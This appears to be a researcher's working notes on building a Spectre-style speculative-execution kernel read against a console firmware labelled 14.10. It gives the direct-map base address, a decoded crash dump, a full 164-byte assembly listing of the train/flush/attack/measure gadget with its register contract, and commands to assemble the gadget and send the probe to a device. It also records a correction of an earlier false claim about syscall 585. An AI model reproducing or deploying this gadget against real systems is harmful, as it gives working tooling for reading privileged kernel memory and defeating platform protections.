# A speculation-based kernel read on 14.10

Status: infrastructure proven, reader built, runtime validation pending a relaunch.
Date: 2026-11-05.  Probes: 1245a, 1245b, 1245c, 1246a.

## 1. Why leave the syscall table alone

Four independent audits closed the class "the kernel copies from an address we name":

| route | verdict |
|---|---|
| aio write-source (669 cmd 2) | user pointer is masked with 0x7fffffffffff, measured (AIO_NOT_A_READER) |
| direct dereference of a caller pointer | 10 of 10 candidates are kernel loads; structural: stac/clac wraps every user access |
| double fetch of the same user source | 43 bodies, every repeat is constant-sized or reads the kernel's own stack copy |
| user-derived copy source or destination | 0 of 301 bodies |

Those four cover the syscall table's copy semantics. They say nothing about the
processor underneath it. A bounds-check-bypass speculation gadget does not need
the kernel's permission - it needs the mapping to be *present*, and on this image
the kernel is mapped in every user page table (no PTI; AMD is not affected by
Meltdown, so FreeBSD does not enable it).

## 2. What the box already gives us

1. native.fcall_with_rax(fn, rax, rdi, rsi, rdx, rcx, r8, r9) - a real indirect call with all six argument registers
   (validated by 1188a and 1213b with eboot gadgets). That is an arbitrary call
   primitive, not a syscall wrapper.
2. The fault-dump oracle (probe 1001a) - the kernel position each boot.
3. The direct map base **0xffff800000000000**, decoded statically from the pmap
   walker at 0x8f1480 (add r14,[rdi+0x20] ; 0xffffffffff000 masking ; + 0xffff800000000000), so physical address 0 is at a fixed
   virtual address no matter where the kernel landed.

Point 3 matters: a speculation test needs a supervisor address whose *content is
predictable*, and physical 0 is the one supervisor address that is sure to be
mapped on every boot.

## 3. Measured: anonymous PROT_EXEC is not honoured

Probe 1245a (probes/phase17_new_vectors/1245a_native_exec_feasibility.lua, result results/phase17_new_vectors/1245a_native_exec_feasibility_20261105_152559.txt, 711 bytes):

    mmap prot7    -> 0x310B28000     (page present, readable, writable)
    mmap prot5    -> 0x310B2C000
    mmap prot0x33 -> 0x310B30000
    bytes at 0x310B28000 after the write: B8 34 12 00 00 C3   (mov eax,0x1234; ret)
    native.fcall_with_rax(0x310B28000) -> process death

The loader's crash handler wrote a 280-byte structure to the socket. Decoded:

| offset | value | meaning |
|---|---|---|
| +0x00 | 0x0000000013371337 | magic |
| +0x08 | 0x0B | SIGSEGV |
| +0x58 | 0x00000000325CE976 | |
| +0x60 | 0x00000007EF9FA890 | |
| +0x88 | 0x0000000032498042 | |
| +0x90 | 0x0000000032498042 | |
| +0x98 | 0x001B0013_0000000C | selectors (same shape as mcontext+0xC0) |
| +0xA0 | 0x0000000310B28000 | |
| +0xA8 | 0x003B003B_00000005 | |
| +0xB8 | 0x0000000310B28000 | **RIP** |
| +0xC0 | 0x43 | CS |
| +0xC8 | 0x0000000000010202 | RFLAGS |
| +0xD0 | 0x00000003109FC868 | RSP |
| +0xD8 | 0x3B | SS |
| +0xE0 | 0x480 | |
| +0xF8 | 0x00000000324989A3 | |
| +0x100 | 0x0000000310B28000 | |
| +0x108 | 0x150E | |
| +0x110 | 0x0000000310B28000 | |

RIP is the page we asked for, CS is 0x43 (ring 3), the page was mapped and
writable. The only reading is that **PROT_EXEC at mmap time is dropped**.

Probe 1245b then re-tested the same call deliberately before invoking
mtypeprotect, which killed the loader before it could report. That was an ordering
mistake, not a result; 1245c removes the pre-test.

## 4. CORRECTION - mtypeprotect(585) does not exist

This section previously claimed that "RW mapping + mtypeprotect(585) = executable
page", quoting probe 44a of 2026-10-16.  Syscall 585's body has since been
disassembled (thunk 0x265DF8 -> body 0x8FC610): it reads no argument at all (rsi is
never touched), always returns 0, and stores one boolean at td+0x408 from a compare
against a fixed global.  It is the sandbox predicate is_in_sandbox, and it cannot
alter a page's protection.

The pattern that survives is only this: an anonymous mmap with prot=7 is readable
and writable and NOT executable, so probe 44a's "NOP SLED SURVIVED" observation must
have been the loader's syscall stub reloading rax rather than the sled running.

Consequence: **there is currently no known executable user page**, so this entire
document is gated on finding one.  The live candidate is a file-backed MAP_PRIVATE
mapping of /app0/eboot.bin (probe 1248a): PROT_EXEC being dropped for anonymous
memory does not imply it is dropped for a vnode object, and a COW mapping would be
writable as well.  Details and the full 585 decode: docs/DMEM_628_AND_SYSCALL_585_14_10.md.

Do not run probe 1246a before 1248a succeeds - its step [4] calls into a page that
1245a measured as non-executable, which kills the loader.

## 5. The gadget

164 bytes, assembled to .local/spectre_sc.bin (assembler .local/asm_spectre2.py, byte table .local/spectre_sc.lua), emitted into the probe as a byte table.
Four phases:

1. **train** 48 times with rdi = a user byte and ecx=0, r8d=1:
   cmp ecx,r8d ; jae skip ; movzx eax,[rbx] ; shl eax,9 ; mov [rsi+rax],1
   The branch is taken 48 times in a row, so the predictor holds "taken".
2. **flush** all 256 probe lines (clflush, 512-byte stride, 128 KiB array).
   This phase has to sit *after* the training loop: training stores to
   probe[train_byte*512], and flushing before it would leave that line hot and
   manufacture a false positive at the training byte's own value.
3. **attack** with ecx=1, r8d=1: cmp ecx,r8d now resolves not-taken, the
   predictor said taken, and the body runs in the shadow of the misprediction.
   rbx = the supervisor address. The load never retires, but it has already
   forwarded its byte into shl eax,9 ; mov [rsi+rax],1, so one probe line is now in L1.
4. **measure** each of the 256 lines with lfence; rdtsc; mov al,[r9]; lfence; rdtsc; sub and return
   (min_delta << 16) | index. The hot line answers in a handful of cycles; every other
   line is a DRAM miss.

Byte-level listing (capstone, verified):

    0000 mov rbx,rdi     0003 xor ecx,ecx      0005 mov r8d,1     000B mov ebp,0x30
    0010 cmp ecx,r8d     0013 jae 0x1f         0015 movzx eax,[rbx] 0018 shl eax,9
    001B mov [rsi+rax],1 001F dec ebp          0021 jne 0x10
    0023 xor ebx,ebx     0025 mov r9,rbx       0028 shl r9,9      002C add r9,rsi
    002F clflush [r9]    0033 inc ebx          0035 cmp ebx,0x100 003B jb 0x25
    003D mfence          0040 mov rbx,rdx      0043 mov ecx,1     0048 cmp ecx,r8d
    004B jae 0x57        004D movzx eax,[rbx]  0050 shl eax,9     0053 mov [rsi+rax],1
    0057 xor ebx,ebx     0059 mov r11d,0x7fffffff  005F mov r12d,-1
    0065 mov r9,rbx      0068 shl r9,9         006C add r9,rsi    006F lfence
    0072 rdtsc           0074 mov r10d,eax     0077 lfence        007A mov al,[r9]
    007D lfence          0080 rdtsc            0082 sub eax,r10d  0085 cmp eax,r11d
    0088 jae 0x90        008A mov r11d,eax     008D mov r12d,ebx  0090 inc ebx
    0092 cmp ebx,0x100   0098 jb 0x65          009A mov eax,r11d  009D shl eax,0x10
    00A0 or eax,r12d     00A3 ret

Register contract: rdi = training byte address, rsi = probe array (128 KiB,
512-byte stride), rdx = attack address. Returns (min_delta << 16) | index.

Two encodings were wrong on the first pass and were caught by disassembling the
output rather than by trusting a mnemonic table: mov r9,rbx is 49 89 D9
(4C 89 CB is the reverse) and add r9,rsi is 49 01 F1 (4C 01 F1 makes the
source r14). Hand-assembling is safe only with a disassembly check.

## 6. The self-validating target

Step one of 1246a reads a **user** byte whose value we choose (0x37). If the
majority index over 16 attempts is not 0x37, the machinery is not working and no
kernel read is claimed.

Step two reads the direct map at physical 0x0, 0x100000, 0x200000, 0x400000,
0x800000, 0x1000000, 0x2000000 and prints four bytes at each. The kernel image is
an ELF, so its load address holds 7F 45 4C 46. That is a known answer for an
unknown (KASLR-slid) address, which is exactly what a first cross-privilege read
needs: it can be verified without already being able to read.

## 7. What would falsify it

- mov eax,0x1234; ret returning something other than 0x1234 after mtypeprotect:
  the exec path is wrong and nothing else in this document applies.
- The user-byte step returning an index that is not 0x37: training, timing or the
  transfer is broken; a kernel attempt would produce noise.
- The user-byte step working while every direct-map byte is noise: the kernel
  mappings are not present in the user page tables (PTI is on) and the whole class
  dies on this firmware. That is the one outcome worth knowing precisely, because
  it would also mean the fault oracle's "present" bit comes from something other
  than a shared page table.

## 8. Reproduce

    python .local/asm_spectre2.py
    python tools/send_probe.py probes/phase17_new_vectors/1246a_speculation_read.lua --ip 192.168.1.121 --save

.local/run1246a.py waits for the loader port and then sends the probe, so a console
relaunch does not have to be timed by hand.

## 9. Relationship to existing docs

- SPECULATION_READ_14_10.md is the CPU route; KERNEL_READ_SEARCH_14_10.md section
  10 is the closure table that forced it.
- UACCESS_HELPERS_14_10.md section 4 supplies the DMAP base used in section 6.
- MCONTEXT_INSTALL_14_10.md section 5 explains why the mcontext shape at blob+0x58
  is the same one 634 exports: both come from the same pcb-to-mcontext filler.